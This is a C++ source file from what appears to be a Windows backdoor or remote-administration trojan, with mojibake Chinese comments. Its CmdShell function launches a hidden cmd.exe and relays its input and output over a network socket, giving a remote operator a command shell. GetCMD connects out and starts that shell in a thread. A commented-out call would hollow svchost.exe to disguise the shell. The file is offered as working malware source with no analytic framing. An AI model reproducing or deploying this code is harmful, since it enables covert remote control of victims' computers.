#include "loadExe.h"

struct _cmdshell
{
	SOCKET s;
	char exe[MAX_PATH];
};
//��cmdfile����ǰ���� by sjdf
int CmdShell(void *lParam)
{
	_cmdshell *pcs = (_cmdshell*)lParam;
	SOCKET Socket = pcs->s;
	LPSTR CmdFile = pcs->exe;
	int retval;
	char recvbuf[MAX_PATH + 1];
	char sendbuf[5120];
	unsigned long cmdtouserlen,usertocmdlen;

	HANDLE hClientReadPipe, hClientWritePipe;
	HANDLE hCmdWritePipe, hCmdReadPipe;

	ZeroMemory(recvbuf,sizeof(recvbuf));

	//�����ܵ�
	SECURITY_ATTRIBUTES pipeattr;
	pipeattr.nLength = sizeof(SECURITY_ATTRIBUTES);
	pipeattr.lpSecurityDescriptor = NULL;
	pipeattr.bInheritHandle = TRUE;

	if (!ZXSAPI::CreatePipe(&hClientReadPipe,
		&hCmdWritePipe,
		&pipeattr,
		0))
	{
		goto exit0;
	}

	if (!ZXSAPI::CreatePipe(&hCmdReadPipe,
		&hClientWritePipe,
		&pipeattr,
		0))
	{
		goto exit1;
	}

	//������������
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	GetStartupInfo(&si);
	si.dwFlags = STARTF_USESHOWWINDOW|STARTF_USESTDHANDLES;
	si.hStdInput = hCmdReadPipe;
	si.hStdError = hCmdWritePipe;
	si.hStdOutput = hCmdWritePipe;
	si.wShowWindow = SW_HIDE;

	//��������cmd.exe
	if (!ZXSAPI::CreateProcess(NULL,
		CmdFile,
		NULL,
		NULL,
		1,
		0,
		NULL,
		NULL,
		&si,
		&pi))
	{
		goto exit2;
	}
/*
	if(!loadExe("c:\\windows\\system32\\svchost.exe", "c:\\windows\\system32\\cmd.exe", &si, &pi))
	{
		goto exit2;
	}
*/
	Sleep(100);


	while(1)
	{
		Sleep(5);

		if (!PeekNamedPipe(hClientReadPipe,
			sendbuf,
			sizeof(sendbuf),
			&cmdtouserlen,
			NULL,
			NULL)
			||
			WaitForSingleObject(pi.hProcess, 0) == WAIT_OBJECT_0)
		{
			goto exit3;
		}

		//ͨ���ӹܵ����յ��ַ����ж��Ǹô��û��������ݻ������û���������
		if(cmdtouserlen)
		{

			if (!ZXSAPI::ReadFile(hClientReadPipe,
				sendbuf,
				cmdtouserlen,
				&cmdtouserlen,
				0))
			{
				goto exit3;
			}

			if (DataSend(Socket, sendbuf, cmdtouserlen) != cmdtouserlen)
			{
				goto exit3;
			}

		}
		else
		{
			retval = SetTimeOut(Socket, 0);
			if(retval > 0)
			{
			
				if ((usertocmdlen=ZXSAPI::recv(Socket,recvbuf,sizeof(recvbuf), 0)) <= 0)
				{
					goto exit3;
				}

				if (!ZXSAPI::WriteFile(hClientWritePipe,
					recvbuf,
					usertocmdlen,
					&usertocmdlen,
					0))
				{
					goto exit3;
				}
			}else if(retval < 0)
			{
				goto exit3;
			}

		}
	}

exit3:
	CloseHandle(pi.hThread);
	ZXSAPI::TerminateProcess(pi.hProcess, 0);
	CloseHandle(pi.hProcess);

exit2:
	CloseHandle(hCmdReadPipe);
	CloseHandle(hClientWritePipe);
exit1:
	CloseHandle(hClientReadPipe);
	CloseHandle(hCmdWritePipe);
exit0:
	closesocket(Socket);
	delete pcs;
	return 1;
}


int GetCMD(MainPara *args)
{
	SPAMFUNCTION
		
	ARGWTOARGVA arg(args->lpCmd);
	int argc = arg.GetArgc();
	char **argv = arg.GetArgv();
	SOCKET Socket = args->Socket;

/*
	if(argc > 1)
		CmdShell(Socket, argv[1]);
	else
		CmdShell(Socket, "cmd.exe");

*/
	SOCKET actionSocket = doAction_Connect(Socket, action_GETCMD);
	if(!actionSocket)
	{
		SendMessage(Socket, "ִ��ָ��ʧ�� :(\r\n");
		return FALSE;
	}

	_cmdshell *pcs = new _cmdshell;
	memset(pcs, 0, sizeof(_cmdshell));
	pcs->s = actionSocket;
	if(argc < 2)
	{
		strncpy(pcs->exe, "cmd.exe", MAX_PATH);
	}else
	{
		strncpy(pcs->exe, argv[1], MAX_PATH);
	}
	doAction_CreateThread(CmdShell, pcs);

	return 0;
}
